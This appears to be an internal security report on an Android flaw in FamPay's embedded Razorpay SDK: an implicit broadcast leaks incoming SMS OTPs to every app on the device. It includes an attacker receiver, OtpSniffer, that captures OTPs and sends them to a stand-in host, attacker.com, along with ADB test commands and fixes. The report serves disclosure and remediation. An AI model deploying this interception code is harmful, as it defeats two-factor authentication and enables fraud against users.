INTERNAL SECURITY REPORT — CHAIN F

Razorpay SmsReceiver — Implicit Broadcast OTP Interception

FamPay Android v4.0.5.7 · Oversecured Finding #4 (Implicit Broadcast) · March 2026

Severity
HIGH
7.8
OTP / 2FA Bypass Potential
Vulnerable Component
com.razorpay.SmsReceiver
Broadcast Action
com.razorpay.events.SMS_PROCESSED
Leaked Data
extra_sender (phone number) + extra_message (OTP content)
Requirement
SMS permission on device (Android ≤ 8.0 no permission needed)

Executive Summary (Non-Technical)

When FamPay processes an SMS (for example, an OTP sent during a payment), Razorpay's code sends a system-wide announcement — an "implicit broadcast" — containing the full SMS text and sender phone number. Because this announcement is sent to all apps on the device (not just FamPay), any malicious app can listen for it and capture OTPs in real time.

Imagine a bank teller reading your OTP out loud in a crowded room — instead of whispering it only to you. Any attacker app that is "in the room" (installed on the device) hears the OTP. They can then use it to authorize transactions before you do.

This effectively breaks Two-Factor Authentication: an attacker who has stolen a user's password (via Chain A / Vuln #16 auth token) and has an app on the device can intercept the OTP to fully take over the account.

Vulnerable Code

SmsReceiver.java (Lines 30–33)

// After SMS is received and parsed:
Intent broadcastIntent = new Intent("com.razorpay.events.SMS_PROCESSED");
broadcastIntent.putExtra("extra_sender", senderAddress);    // phone number
broadcastIntent.putExtra("extra_message", messageBody);     // full SMS with OTP
context.sendBroadcast(broadcastIntent);                     // sent to ALL apps

No permission protection: sendBroadcast(intent) is called without a receiverPermission parameter. Any app can register for com.razorpay.events.SMS_PROCESSED.

Attack Chain

1
Attacker installs malicious app on victim's device
Registers a BroadcastReceiver for com.razorpay.events.SMS_PROCESSED — no permissions required
2
Victim initiates payment in FamPay
Razorpay sends OTP via SMS to the registered phone number
3
FamPay's SmsReceiver reads the OTP
Sends implicit broadcast with full SMS text and sender number
4
Malicious app receives the broadcast
Captures OTP from extra_message. Sends it to attacker's server via network.
5
Attacker uses OTP to complete fraudulent transaction
Combined with stolen auth token (Chain A/C), attacker can authorize transfers without victim's knowledge

ADB Proof of Concept

Step 1 — Register a receiver (in attacker's APK)
// AndroidManifest.xml
<receiver android:name=".OtpSniffer" android:exported="true">
  <intent-filter>
    <action android:name="com.razorpay.events.SMS_PROCESSED" />
  </intent-filter>
</receiver>

// OtpSniffer.java
public void onReceive(Context ctx, Intent intent) {
    String sender  = intent.getStringExtra("extra_sender");
    String message = intent.getStringExtra("extra_message");
    // exfiltrate to attacker server
    new Thread(() -> {
        try {
            URL url = new URL("https://attacker.com/log?tag=otp&data="
                + URLEncoder.encode(sender + "|" + message, "UTF-8"));
            url.openConnection().getInputStream();
        } catch(Exception e) {}
    }).start();
}
Step 2 — Simulate the broadcast with ADB (validation)
# Simulate what FamPay's SmsReceiver sends after processing an OTP SMS
adb shell am broadcast \
  -a com.razorpay.events.SMS_PROCESSED \
  --es extra_sender "+917001234567" \
  --es extra_message "FamPay OTP is 482931. Do not share with anyone." \
  com.fampay.in
Step 3 — Verify receiver gets it (on attacker app)
# In attacker app's logcat
adb logcat -s OtpSniffer:D
# Should see: Received OTP: 482931 from +917001234567

Remediation

Fix 1 — Add permission to broadcast (immediate fix)

// Use a custom signature-level permission
<!-- AndroidManifest.xml -->
<permission
  android:name="com.fampay.in.RECEIVE_RAZORPAY_SMS"
  android:protectionLevel="signature" />

// In code:
context.sendBroadcast(broadcastIntent, "com.fampay.in.RECEIVE_RAZORPAY_SMS");

Fix 2 — Use LocalBroadcastManager (preferred)

// Stay within the app process — no other app can intercept
LocalBroadcastManager.getInstance(context)
    .sendBroadcast(broadcastIntent);

// Receiver must also use LocalBroadcastManager.registerReceiver()

Fix 3 — Escalate to Razorpay

This is a vulnerability in the Razorpay SDK embedded in FamPay. File a security report with Razorpay's security team at security@razorpay.com requesting an SDK patch. Pin to a patched version once released. This affects all apps embedding the Razorpay SDK, not just FamPay.
